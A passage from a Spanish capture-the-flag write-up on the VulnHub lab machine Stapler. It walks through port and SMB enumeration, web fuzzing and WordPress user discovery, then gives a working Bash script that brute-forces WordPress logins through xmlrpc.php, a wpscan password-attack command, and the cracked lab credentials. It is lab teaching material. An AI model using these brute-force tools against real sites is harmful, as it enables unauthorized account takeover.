-----

Autor: [deeb](https://github.com/tryto-deeb/)
<br>
Dificultad: Fácil
<br>
CTF: [Stapler](https://www.vulnhub.com/entry/stapler-1,150/)


-----

HTTPS, Fuzzing, Wordpress, User Enumeration, Exploiting XMLRPC, Password as Username, Escalada de Privilegios

-----

<br>

# Enumeración 

## Escaneo de puertos


```shell
sudo nmap -p- --open -sS -n -Pn --min-rate 5000 -vvv -oG scan.txt 10.10.0.9
```
```output
-- output --

Nmap scan report for 10.10.0.9
Host is up (0.034s latency).
Not shown: 65523 filtered tcp ports (no-response), 4 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
139/tcp   open  netbios-ssn
666/tcp   open  doom
3306/tcp  open  mysql
12380/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.46 seconds
```
<br>

## Escaneo de Servicios


```shell
nmap -p21,22,53,80,139,666,3306,12380 -sCV 10.10.0.9
```
```output
-- output --

Nmap scan report for 10.10.0.9
Host is up (0.036s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.1.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c7:d5:5c:58:2d:9b:d0:72:cb:ba:93:8e:c7:49:2c:c6 (RSA)
|   256 1a:73:26:4e:4e:f3:f2:be:9e:83:7c:24:ad:a8:95:80 (ECDSA)
|_  256 91:55:11:37:cc:84:86:6b:03:20:c8:2d:2c:ca:be:f7 (ED25519)
53/tcp    open  tcpwrapped
80/tcp    open  http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open  doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 43142
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongPassword, LongColumnFlag, ConnectWithDatabase, DontAllowDatabaseTableColumn, InteractiveClient, FoundRows, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, SupportsLoadDataLocal, SupportsCompression, IgnoreSigpipes, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: n.,ya?Z\x164|,ek\x03;o\x02 %\x0B
|_  Auth Plugin Name: mysql_native_password
12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.94SVN%I=7%D=10/21%Time=67168C79%P=x86_64-pc-linux-gnu%r
SF:(NULL,1841,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\
SF:0\x152\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x0
SF:1\x04\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A
SF:@\xa2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\
SF:xa2\x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x
SF:0f\xb2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\
SF:xaeu\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x9
SF:9\xd3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf
SF:8\xa0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce
SF:\[\x87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x
SF:8b\xf4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\x
SF:e0\xdc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe
SF:4\xd5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf
SF:1\xaf\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\
SF:xe2:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x
SF:1bk\x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\
SF:xcc\xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c
SF:\xfd\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\
SF:xcc\x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\
SF:xb0\xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(
SF:\[r\xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\
SF:xaak\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x
SF:7fy\xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f
SF:\x7f\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\
SF:xcb\[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\x
SF:f9\xcc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8
SF:f\xa7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\
SF:x81\xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0b
SF:I\x96\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap
SF:\x8f\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&
SF:\xf4\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\
SF:xcd\x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xb
SF:c\xbcL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5
SF:\xf0\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\
SF:x04\xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6G
SF:TQ\xf3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\
SF:x11\?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: stapler
|   NetBIOS computer name: RED\x00
|   Domain name: europe-west1-b.c.hackjourney-prod.internal
|   FQDN: stapler.europe-west1-b.c.hackjourney-prod.internal
|_  System time: 2024-10-21T18:16:50+01:00
|_clock-skew: mean: -20m03s, deviation: 34m37s, median: -4s
|_nbstat: NetBIOS name: STAPLER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-10-21T17:16:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.28 seconds
```
<br>
<br>


## Recopilación de información y usuarios

<br>

### Puerto 21 : FTP


En el servicio FTP se esta utilizando *vsftpd* en la *versión 3.0.3*, al comprobar si existe algún exploit con `searchsploit` no vemos ningún exploit que nos pueda ser útil para poder explotarlo.
Sin embargo si nos permite conectarnos con el usuario anonymous aunque tampoco nos permite listar con `ls` , ni descargar el contenido en modo pasivo con `mget *` . Lo que si encontramos es un banner con un posible nombre de usuario **Harry**.


![Stapler/Capturas/Pasted image 20241022121702.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241022121702.png)

<br>

### Puerto 22: SSH


En el puerto 22 esta el servicio *OpenSSH* en la version *7.2p2*, lanzamos una serie de scripts con nmap, enumeración de usuarios con Metasploit y fuerza bruta para el usuario Harry, todo ello sin éxito.

<br>

### Puerto 80 : HTTP


Parece que en el puerto esta corriendo un *servidor PHP CLI* en la *versión 5.5 o posterior*, que se suele utilizar para desarrollo rápido y proyectos de prueba, pero no para producción. Al introducir la IP en el navegador nos dice que no se encuentra ninguna página web.

<br>

### Puerto 53: DNS


El puerto 53 está asociado comúnmente con el servicio de DNS. Cuando ves **tcpwrapped** en el escaneo de Nmap, significa que el servicio está detrás de un wrapper de TCP, lo que puede indicar que el servicio está protegido por una capa adicional de seguridad o que el acceso está restringido.

<br>

### Puerto 666


Por el puerto 666 al analizar la información que nos arroja nmap vemos que parece ser una imagen message2.jpg. Si observamos el encabezado del archivo `PK\x03\x04` pertenece a un archivo ZIP lo que nos hace pensar que se esta transfiriendo una mensaje en una imagen comprimida.

Descargar el archivo zip con netcat

```shell 
nc 10.10.0.9 666 > port666.zip 
```
<br>

Descomprimimos el archivo:

```shell
unzip port666.zip
```
```output
Archive:  port666.zip
  inflating: message2.jpg            
```
<br>

Y obtenemos la imagen con el siguiente mensaje:

<br>

![Stapler/Capturas/Pasted image 20241022131226.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241022131226.png)

<br>

Nada relevante a parte del nombre de **Scott**, asique ya tenemos otro posible nombre de usuario que añadir a la lista.

<br>

### Puerto 3306 : SQL


En el puerto 3306 identificamos el servicio *MySQL* con la *versión 5.7.12* mediante el cual podríamos conectarnos a la base de datos en caso de conseguir los credenciales necesarios.

<br>

### Puerto 139 : SMB


En el puerto 139 esta corriendo un servicio *smb* con la *versión 4.3.9*, aquí si vamos a lanzar una serie de scripts de reconocimiento con nmap para obtener más información.

```shell
nmap -p139 --script="smb-*" 10.10.0.9
```
```output
-- output --

Stats: 0:04:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
Nmap scan report for 10.10.0.9
Host is up (0.035s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn

...

| smb-ls: Volume \\10.10.0.9\kathy
| SIZE     TIME                 FILENAME
| <DIR>    2016-06-03T16:52:52  .
| <DIR>    2016-06-06T21:39:56  ..
| <DIR>    2016-06-05T15:02:27  kathy_stuff
| 64       2016-06-05T15:02:27  kathy_stuff\todo-list.txt
| <DIR>    2016-06-05T15:04:14  backup
| 5961     2016-06-05T15:03:45  backup\vsftpd.conf
| 6321767  2015-04-27T17:14:46  backup\wordpress-4.tar.gz

...

| smb-enum-shares: 
|   account_used: guest
|   \\10.10.0.9\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (stapler server (Samba, Ubuntu))
|     Users: 3
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.0.9\kathy: 
|     Type: STYPE_DISKTREE
|     Comment: Fred, What are we doing here?
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\samba\
|     Anonymous access: READ
|     Current user access: READ
|   \\10.10.0.9\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.0.9\tmp: 
|     Type: STYPE_DISKTREE
|     Comment: All temporary files should be stored here
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\tmp
|     Anonymous access: READ
|_    Current user access: READ/WRITE

...

Nmap done: 1 IP address (1 host up) scanned in 382.26 seconds
```

<br>

Vemos que tenemos permiso de lectura como el usuario **anonymous** para el recurso **kathy** con el directorio *kathy_stuff* que contiene el archivo `todo-list.txt` y otro directorio *backup* que contiene un archivo de configuración de `vsftpd.conf` y lo que parece un comprimido `wordpress-4.tar.gz` de archivos de respaldo de un servicio wordpress .

Añadimos dos nombres más a la lista de posibles usuarios, **Fred** y **kathy**.

<br>

Conectarse al recurso kathy como usuario anonymous

```shell
smbclient //10.10.0.9/kathy -N
```

![Stapler/Capturas/Pasted image 20241022192010.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241022192010.png)

<br>

Nos descargamos con `get` todos los archivos para revisarlos.

Después de revisar a fondo los archivos, en especial el backup de wordpress en busca de algun archivo como wp-config.php que contenga credenciales, plugins o alguna configuración que nos permita explotar la máquina, no encontramos nada de nada.

<br>

Utilizamos la herramienta `enum4linux` para ver si podemos obtener algo más de información a traves del servicio smb.

```shell
enum4linux 10.10.0.9
```
```output
-- output --

...

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
S-1-22-1-1030 Unix User\ubuntu (Local User)
```

Enumeramos una buena lista de nombres de usuarios. 

<br>

### Puerto 12380 : HTTP / HTTPS

<br>

En el *puerto 12380* esta corriendo un servidor *Apache httpd 2.4.18* que contiene una web que parece estar en construcción .

<br>

![Stapler/Capturas/Pasted image 20241022193946.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241022193946.png)

<br>

Tras usar `gobuster` en busca de descubrimiento de directorios u otros archivos, no encontramos nada , simplemente es una página que no esta terminada.

Después de hacer muchas pruebas en busca de algún hilo más donde tirar intentamos cambiar el protocolo *http* por *https* y ponemos en el navegador `htts://10.10.0.9:12380`.

<br>

![Stapler/Capturas/Pasted image 20241023113831.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241023113831.png?raw=true)

<br>

Parece ser que sí funciona y encontramos una página interna de la empresa initech. Al intentar conectarnos el navegador nos da el aviso de que la conexión no es segura asique analizamos con distintas herramientas como `openssl` y `sslyze` en busca de alguna vulnerabilidad en el certificado, pero no encontramos nada simplemente esta autofirmado y el navegador lo considera inseguro esto será algo a tener en cuenta más adelante.

El siguiente paso será FUZZear la url en busca de directorios o archivos .php, .html y .txt para ello usaremos la herramienta `wfuzz`.

```shell
wfuzz -c -t 200 --hc=404 --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.0.9:12380/FUZZ
```
<br>

Encontramos dos rutas :

- `https://10.10.0.9:12380/announcements` donde simplemente vemos un mensaje a la usuario **Abby**

- `https://10.10.0.9:12380/phpmyadmin` un sistema de login para gestionar las bases de datos, pero que al no tener credenciales no conseguimos tener acceso. 


Posteriormente repetimos el proceso de FUZZing para archivos `.php` y `.html` sin éxito.


Y por último lo intentamos con archivos .txt

```shell
wfuzz -c -t 200 --hc=404 --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.0.9:12380/FUZZ.txt
```
```output
-- output --

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.0.9:12380/FUZZ.txt
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000001765:   200        3 L      6 W        59 Ch       "robots"                                                                                                               

Total time: 0
Processed Requests: 220560
Filtered Requests: 220559
Requests/sec.: 0
```
<br>

![Stapler/Capturas/Pasted image 20241023124039.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241023124039.png)

Encontramos dos rutas más :

- `/admin112233/` Aquí no hay nada más que lo que parece un broma del creador de la web.

- `/blogblog/` Aquí sí, encontramos la web de Initech en la que se utiliza **wordpress** *version 4.2.1*

<br>

![Stapler/Capturas/Pasted image 20241023125135.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241023125135.png)

Enumeramos un usuarios mas : **jonh**

<br>

Escaneamos el wordpress con `wpscan` en busca de vulnerabilidades.

 - `--disable-tls-checks` : indicas a wpscan que ignore la verificación del certificado SSL/TLS, lo cual es necesario cuando te conectas a un servidor con un certificado autofirmado o no confiable.
 

```shell
wpscan --url https://10.10.0.9:12380/blogblog/ --disable-tls-checks  
```
```output
-- output --

+] URL: https://10.10.0.9:12380/blogblog/ [10.10.0.9]
[+] Started: Mon Oct 21 10:15:11 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://10.10.0.9:12380/blogblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://10.10.0.9:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://10.10.0.9:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://10.10.0.9:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://10.10.0.9:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)
 |  - https://10.10.0.9:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://10.10.0.9:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>

[+] WordPress theme in use: bhost
 | Location: https://10.10.0.9:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2024-03-13T00:00:00.000Z
 | Readme: https://10.10.0.9:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: https://10.10.0.9:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://10.10.0.9:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=========================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

```

<br>

Aquí encontramos algunas vías interesantes como podría ser la explotación de `/xmlrpc.php` o el directorio `/uploads` para la subida de archivos maliciosos

<br>

Por último enumeramos los usuarios con `wpscan`

```shell
wpscan --url https://10.10.0.9:12380/blogblog/ --disable-tls-checks --enumerate u
```
```output
-- output --

[i] User(s) Identified:

[+] John Smith
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] barry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] elly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] heather
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] garry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] harry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] scott
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] kathy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tim
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```



<br>
<br>
<br>




----



# Explotación 


## Explotación del archivo xmlrpc.php

<br>


>El archivo **xmlrpc.php** en WordPress es una interfaz que permite la comunicación remota entre WordPress y aplicaciones externas mediante el protocolo XML-RPC (Remote Procedure Call). Su principal función es permitir >la realización de acciones en el sitio, como publicar entradas o editar contenido, a través de clientes externos, como aplicaciones móviles de WordPress o herramientas de terceros. HTTP actúa como el mecanismo de >transporte, mientras que XML se utiliza como el mecanismo de codificación para estructurar y enviar los datos.

<br>

### Explotación Manual

Comprobar si el xmlrpc.php esta activo y en funcionamiento

<br>

![Stapler/Capturas/Pasted image 20241025113619.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241025113619.png)

<br>

```shell
 curl -k -s -X POST "https://10.10.0.9:12380/blogblog/xmlrpc.php" 
```
```output
-- output --

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>-32700</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>parse error. not well formed</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

<br>


Crear un archivo.xml con la data `system.listMethods` en formato xml para que nos liste todos los métodos a los que se puede llamar a través del archivo xmlrpc.php

```xml
<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```
<br>

Le enviamos con `curl` una petición por Post con la data que contiene el archivo.xml para ver si contiene el método `getUsersBlogs` que nos indicaría que es vulnerable a ataques de fuerza bruta en el loggin [explotando el archivo xmlrpc.php](https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/).

- `-k` (o `--insecure`) especifica que no verifique el certificado SSL del servidor. Esto es útil cuando te conectas a servidores con certificados autofirmados o expirados.


```shell
curl -k -s -X POST "https://10.10.0.9:12380/blogblog/xmlrpc.php" -d@file.xml | grep wp.getUsersBlogs
```
```output
-- output --

<value><string>wp.getUsersBlogs</string></value>
```
<br>

Creamos un script básico en Bash que irá mandando una petición por cada palabra del diccionario, en este caso `rockyou.txt` , tan solo tendremos que especificar en la variable `user` el nombre de usuario al que queremos aplicar fuerza bruta.

```shell
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Forzando salida del script..."
    exit 1
}

#Ctrl+c
trap ctrl_c SIGINT

function crearXML(){
    password=$1
    user=<Nombre_Usuario>
    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$user</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"""

    echo $xmlFile > file.xml

    response=$(curl -k -s -X POST "https://10.10.0.9:12380/blogblog/xmlrpc.php" -d@file.xml)

    if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
        echo -e "\n[+] La contraseña de $user es $password"
        exit 0
    fi

}

cat /usr/share/wordlists/rockyou.txt | while read password; do
    crearXML $password
    echo "Probando contraseña : "$password

done
```



Obtenemos algunos credenciales :

- **harry** : *monkey*
- **garry** : *football*
- **scott** : *cookie*

<br>

### Fuerza Bruta con wpscan


Podemos aplicar fuerza bruta al loggin de forma automática y mas eficiente con `wpscan` pasándole un listado de usuarios y un listado de contraseñas.

```shell
wpscan --url https://10.10.0.9:12380/blogblog/ --disable-tls-checks --force -U wordpress_users.txt --password-attack wp-login -P /usr/share/wordlists/rockyou.txt
```
```output
-- output --

[+] Performing password attack on Wp Login against 10 user/s
[SUCCESS] - harry / monkey                                                                                                                                                              
[SUCCESS] - garry / football                                                                                                                                                            
[SUCCESS] - scott / cookie                                                                                                                                                              
[!] Valid Combinations Found:
 | Username: harry, Password: monkey
 | Username: garry, Password: football
 | Username: scott, Password: cookie

```

<br>

Al entrar en el wordpress con cualquiera de los credenciales observamos el mensaje de que no somo administrador, lo que nos restringe ciertas funciones como la subida de archivos que podríamos haber explotado ya que teníamos acceso a la ruta `https://10.10.0.9:12380/blogblog/wp-content/uploads/`

![Stapler/Capturas/Pasted image 20241023192431.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241023192431.png)

![Stapler/Capturas/Pasted image 20241023192353.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241023192353.png)


Asique nada , toca seguir buscando.

<br>

### Fuerza Bruta SSH Password como Username


